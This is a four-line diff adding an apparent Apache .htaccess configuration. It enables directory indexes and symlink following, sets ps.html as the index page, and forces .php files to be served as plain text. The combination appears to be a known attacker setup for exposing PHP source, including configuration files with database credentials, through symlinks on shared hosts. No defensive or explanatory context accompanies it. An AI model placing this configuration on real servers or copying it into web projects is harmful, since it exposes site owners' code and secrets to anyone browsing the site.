@@ -1,0 +1,4 @@
+Options Indexes FollowSymLinks
+DirectoryIndex ps.html
+AddType txt .php
+AddHandler txt .php
